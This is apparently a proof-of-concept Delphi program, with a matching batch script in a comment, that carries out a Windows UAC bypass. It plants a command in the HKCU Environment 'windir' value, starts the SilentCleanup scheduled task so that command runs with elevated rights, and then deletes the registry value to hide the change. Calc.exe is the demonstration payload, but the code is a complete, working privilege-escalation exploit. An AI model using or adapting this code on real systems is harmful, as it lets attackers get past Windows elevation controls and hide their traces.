program QuietShower_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
echo "ShedTaskUAC.bat"
@echo off
timeout /t 3 >nul
reg add "HKCU\Environment" /v "windir" /d "cmd /c start calc.exe&REM " >nul
timeout /t 5 >nul
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
timeout /t 3 >nul
reg delete "HKCU\Environment" /v "windir" /F
timeout /t 2 >nul

}


//https://stackoverflow.com/questions/18013251/delphi-createprocess-execute-multiple-commands


uses
  SysUtils,
  windows,
  registry;

function sr(hivepath,valueitem,param : string): Boolean;
var
  reg: tregistry;
begin
  reg := tregistry.create;
  if reg.OpenKey(hivepath, False) then
  begin
    reg.WriteString(valueitem, param);
    reg.CloseKey;
    reg.Free;
  end;
end;


function se(input: string): Boolean;
var
  StartInfo: TStartupInfo;
  ProcInfo: TProcessInformation;
  CreateOk : Boolean;


begin
   CreateOk := CreateProcess(
    nil,
    PChar(input),
    nil,
    nil,
    False,
    CREATE_NEW_PROCESS_GROUP or NORMAL_PRIORITY_CLASS,
    nil,
    'D:\Qport\trunk\Qport',
    StartInfo,
    ProcInfo
  );

  if CreateOk then
    WriteLn('[+] Success, wait for your command to proc');
end;


begin
var
  cmd, param, path, com : string;
  cmd := 'cmd.exe';
  path := 'C:\Windows\Tasks';


  try
  WriteLn('[+] set registry & sleep 5');
    sleep(5000);
    sr('HKCU\Environment','windir','cmd /c start calc.exe&REM ');


  WriteLn('[+] run sched to proc');
    sleep(5000);
    param := 'schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul';
    com := cmd + ' /C ' + param;
    se(com);


  WriteLn('[+] cleanup');
    sleep(5000);
    param := '/C reg delete "HKCU\Environment" /v "windir" /F >nul';
    com := cmd + ' /C ' + param;
    se(com);


  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
